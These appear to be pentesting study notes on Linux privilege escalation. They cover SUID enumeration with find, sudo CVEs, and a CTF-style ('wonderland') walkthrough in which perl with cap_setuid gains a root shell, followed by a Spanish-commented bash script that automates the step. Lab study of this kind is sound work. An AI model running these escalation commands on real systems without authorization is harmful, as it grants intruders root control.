---
title: SUID & Capabilities
date: 2026-02-15 21:00:00 +0100
categories: [04-Privilege-Escalation, Linux]
tags: [suid, capabilities, gtfobins, root]
author: kairos
---

## Find

```bash
find / -perm -4000 2>/dev/null
```

---

## **Detailed Breakdown**

- `find /`: Searches starting from the root directory `/`.
    
- `-perm -4000`: Looks for files with the **SUID (Set User ID)** permission bit set.
    
    - `4000` means the file executes with the privileges of the file owner (commonly root).
        
- `2>/dev/null`: Suppresses error messages (redirects standard error to `/dev/null`).
    

---

## **Purpose of the Command**

This command searches for all files on the system with the **SUID bit** set. SUID binaries are executed with the privileges of their owner, often **root**, making them highly relevant for **privilege escalation** during penetration testing or Red Team activities.

---

## **Found Binaries in Your Output**

The list includes:

|**Binary**|**Description**|
|---|---|
|`/usr/bin/chfn`|Change real name or other user information|
|`/usr/bin/passwd`|Change user passwords|
|`/usr/bin/sudo`|Execute commands as another user (root)|
|`/usr/bin/chsh`|Change login shell|
|`/usr/bin/mount`|Mount file systems|
|`/usr/bin/gpasswd`|Administer `/etc/group` memberships|
|`/usr/bin/umount`|Unmount file systems|
|`/usr/bin/newgrp`|Switch to a new group|
|`/usr/bin/su`|Switch user (usually root)|
|`/usr/lib/dbus-1.0/dbus-daemon-launch-helper`|D-Bus related, often root-executed helper|
|`/usr/lib/openssh/ssh-keysign`|Used during SSH host authentication|

These binaries are **legitimately SUID**, but depending on version or misconfigurations, some may be **exploitable for privilege escalation**.

---

## **Common Exploitable SUID Binaries**

Check versions and known exploits for:

- `sudo`: Older versions may allow commands to be run as root without password (e.g., `CVE-2019-14287`, `CVE-2021-3156`).
    
- `chfn` / `chsh`: Sometimes abusable for privilege escalation depending on PAM configurations.
    
- `mount` / `umount`: Can be exploited if mountable file systems aren't properly restricted.
    
- `su`: Useful for switching to root if you already have credentials.
    

---

## **Other Useful Arguments for Finding SUID/SGID Files**

- **Find SUID and SGID files:**
    
    ```bash
    find / -perm -4000 -o -perm -2000 2>/dev/null
    ```
    
- **Find only root-owned SUID files:**
    
    ```bash
    find / -user root -perm -4000 2>/dev/null
    ```
    
- **Look for world-writable SUID files (extremely dangerous):**
    
    ```bash
    find / -perm -4007 2>/dev/null
    ```
    

---

## **Summary**

The command lists all SUID binaries on the system, key targets for escalating privileges. The identified binaries should be individually analyzed for version-specific vulnerabilities or unsafe configurations. This technique is a standard step during post-exploitation to move from low-privileged shell to root.

---


---

---

## Getcap Exploit

```shell
hatter@wonderland:/home/hatter$ newgrp hatter
hatter@wonderland:/home/hatter$ groups | grep hatter
hatter rabbit
hatter@wonderland:/home/hatter$ getcap perl
perl (No such file or directory)
hatter@wonderland:/home/hatter$ getcap 
usage: getcap [-v] [-r] [-h] <filename> [<filename> ...]

        displays the capabilities on the queried file(s).
hatter@wonderland:/home/hatter$ getcap /usr/bin/perl*
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.26.1 = cap_setuid+ep
hatter@wonderland:/home/hatter$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=1003(hatter)
gid=1003(hatter)
groups=1002(rabbit),1003(hatter)
hatter@wonderland:/home/hatter$ 
hatter@wonderland:/home/hatter$ ls -la /usr/bin/perl*
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
-rwxr-xr-x 1 root root     10216 Nov 19  2018 /usr/bin/perl5.26-x86_64-linux-gnu
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1
-rwxr-xr-x 2 root root     45853 Nov 19  2018 /usr/bin/perlbug
-rwxr-xr-x 1 root root       125 Nov 19  2018 /usr/bin/perldoc
-rwxr-xr-x 1 root root     10864 Nov 19  2018 /usr/bin/perlivp
-rwxr-xr-x 2 root root     45853 Nov 19  2018 /usr/bin/perlthanks
hatter@wonderland:/home/hatter$ perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
root@wonderland:/home/hatter# 

```

Automated script

```shell
#!/bin/bash

# Script para escalada rápida a root desde hatter
# Usar cuando ya tengas acceso como usuario hatter

echo "=== Escalada Rápida a Root desde Hatter ==="

# Verificar que somos hatter
current_user=$(whoami)
if [ "$current_user" != "hatter" ]; then
    echo "Error: Este script debe ejecutarse como hatter"
    echo "Usuario actual: $current_user"
    exit 1
fi

echo "[+] Verificando capabilities de perl..."
if ! getcap /usr/bin/perl | grep -q "cap_setuid+ep"; then
    echo "[-] Error: perl no tiene la capability cap_setuid+ep"
    exit 1
fi

echo "[+] Verificando permisos en perl..."
if [ ! -x "/usr/bin/perl" ]; then
    echo "[!] No tenemos permisos de ejecución en perl"
    echo "[+] Intentando cambiar al grupo hatter..."
    
    # Cambiar al grupo hatter y ejecutar perl
    newgrp hatter << 'EOF'
echo "[+] Ahora en grupo hatter"
echo "[+] Ejecutando escalada a root con perl CAP_SETUID..."
perl -e 'use POSIX qw(setuid); setuid(0); print "¡Root conseguido!\nUsuario: "; system("whoami"); print "UID: "; system("id -u"); exec "/bin/bash";'
EOF
else
    echo "[+] Tenemos permisos de ejecución en perl"
    echo "[+] Ejecutando escalada a root con perl CAP_SETUID..."
    perl -e 'use POSIX qw(setuid); setuid(0); print "¡Root conseguido!\nUsuario: "; system("whoami"); print "UID: "; system("id -u"); exec "/bin/bash";'
fi

echo "[+] Si llegaste aquí, algo salió mal con la escalada"
```

---


---

---

